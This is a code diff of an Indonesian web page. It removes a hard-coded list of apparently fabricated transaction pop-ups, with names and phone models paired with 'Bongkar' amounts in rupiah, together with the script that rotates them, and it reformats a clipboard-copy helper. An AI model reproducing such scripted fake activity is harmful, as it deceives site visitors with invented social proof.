-  { title: 'Agung Rahman', message: 'Bongkar 50B | Rp. 3.100.000.' },
-  { title: 'Poco X3 pro', message: 'Bongkar 15B | Rp. 930.000.' },
-  { title: 'Infinix', message: 'Bongkar 5B | Rp. 310.000.' },
-  { title: 'Agus Rahman', message: 'Bongkar 5B | Rp. 310.000.' },
-  { title: 'RMX 1020', message: 'Bongkar 100B | Rp. 6.200.000.' },
-  { title: 'Walleye', message: 'Bongkar 30B | Rp. 1.860.000.' },
-  { title: 'Siti Aisyah', message: 'Bongkar 200B | Rp. 12.400.000.' },
-  { title: 'Iphone', message: 'Bongkar 6B | Rp. 372.000.' },
-  { title: 'Agung Rahman', message: 'Bongkar 100B | Rp. 6.200.000.' },
-  { title: 'Randi Purnama', message: 'Bongkar 10B | Rp. 620.000.' },
-  { title: 'Infinix pro', message: 'Bongkar 5B | Rp. 310.000.' },
-  { title: 'Agus Rahman', message: 'Bongkar 2B | Rp. 124.000.' },
-  { title: 'Siti Aisyah', message: 'Bongkar 7B | Rp. 434.000.' },
-  { title: 'RMX 8090', message: 'Bongkar 25B | Rp. 1.550.000.' },
-  { title: 'Walleye', message: 'Bongkar 1B | Rp. 62.000.' },
-  { title: 'Poco X3 pro', message: 'Bongkar 13B | Rp. 806.000.' },
-  { title: 'Agus Junaidi', message: 'Bongkar 60B | Rp. 3.720.000.' },
-  { title: 'Infinix', message: 'Bongkar 4B | Rp. 248.000.' },
-  { title: 'Poco X3 pro', message: 'Bongkar 14B | Rp. 868.000.' },
-  { title: 'Siti Aisyah', message: 'Bongkar 7B | Rp. 434.000.' },
-  { title: 'RMX 7090', message: 'Bongkar 11B | Rp. 682.000.' },
-  { title: 'Rido Putra', message: 'Bongkar 10B | Rp. 620.000.' },
-  { title: 'Agus Junaidi', message: 'Bongkar 55B | Rp. 3.410.000.' },
-  { title: 'Infinix pro', message: 'Bongkar 50B | Rp. 3.100.000.' },
-  { title: 'Walleye', message: 'Bongkar 5B | Rp. 310.000.' },
-  { title: 'Agung Rahman', message: 'Bongkar 50B | Rp. 3.100.000.' },
-  { title: 'Poco X3 pro', message: 'Bongkar 15B | Rp. 930.000.' },
-  { title: 'Infinix', message: 'Bongkar 5B | Rp. 310.000.' },
-  { title: 'Agus Rahman', message: 'Bongkar 5B | Rp. 310.000.' },
-  { title: 'RMX 1020', message: 'Bongkar 100B | Rp. 6.200.000.' },
-  { title: 'Walleye', message: 'Bongkar 30B | Rp. 1.860.000.' },
-  { title: 'Siti Aisyah', message: 'Bongkar 200B | Rp. 12.400.000.' },
-  { title: 'Iphone', message: 'Bongkar 6B | Rp. 372.000.' },
-  { title: 'Agung Rahman', message: 'Bongkar 100B | Rp. 6.200.000.' },
-  { title: 'Randi Purnama', message: 'Bongkar 10B | Rp. 620.000.' },
-  { title: 'Infinix pro', message: 'Bongkar 5B | Rp. 310.000.' },
-  { title: 'Agus Rahman', message: 'Bongkar 2B | Rp. 124.000.' },
-  { title: 'Siti Aisyah', message: 'Bongkar 7B | Rp. 434.000.' },
-  { title: 'RMX 8090', message: 'Bongkar 25B | Rp. 1.550.000.' },
-  { title: 'Walleye', message: 'Bongkar 1B | Rp. 62.000.' },
-  { title: 'Poco X3 pro', message: 'Bongkar 13B | Rp. 806.000.' },
-  { title: 'Agus Junaidi', message: 'Bongkar 60B | Rp. 3.720.000.' },
-  { title: 'Infinix', message: 'Bongkar 4B | Rp. 248.000.' },
-      ];
 
-            const container = document.getElementById('notifications-container');
-            let currentIndex = 0;
-
-            function createNotification(notification) {
-                const notificationDiv = document.createElement('div');
-                notificationDiv.className = 'notification';
-
-                const icon = document.createElement('img');
-                icon.src = 'img/reg_gold_.png';
-                icon.alt = 'Icon Pemberitahuan';
-                icon.className = 'notification-icon';
-
-                const contentDiv = document.createElement('div');
-                contentDiv.className = 'notification-content';
-
-                const titleDiv = document.createElement('div');
-                titleDiv.className = 'notification-title';
-                titleDiv.textContent = notification.title;
-
-                const messageDiv = document.createElement('div');
-                messageDiv.className = 'notification-message';
-                messageDiv.textContent = notification.message;
-
-                contentDiv.appendChild(titleDiv);
-                contentDiv.appendChild(messageDiv);
-                notificationDiv.appendChild(icon);
-                notificationDiv.appendChild(contentDiv);
-
-                container.appendChild(notificationDiv);
-
-                
-                setTimeout(() => {
-                    container.removeChild(notificationDiv);
-                }, 4000);
-            }
-
-            function showNotifications() {
-                setInterval(() => {
-                    createNotification(notifications[currentIndex]);
-                    currentIndex = (currentIndex + 1) % notifications.length;
-                }, 6000); 
-            }
-
-            showNotifications();
-        });
-
-function copyID(){
-  const el = document.getElementById('idPenerima');
-  el.select(); el.setSelectionRange(0,99999);
-  navigator.clipboard.writeText(el.value);
-  alert('COPY: ' + el.value);
+function copyID() {
+    const el = document.getElementById('idPenerima');
+    el.select();
+    navigator.clipboard.writeText(el.value);
+    alert('ID Berhasil Disalin: ' + el.value);
 }
 </script>
- </body>
+
+</body>
 </html>
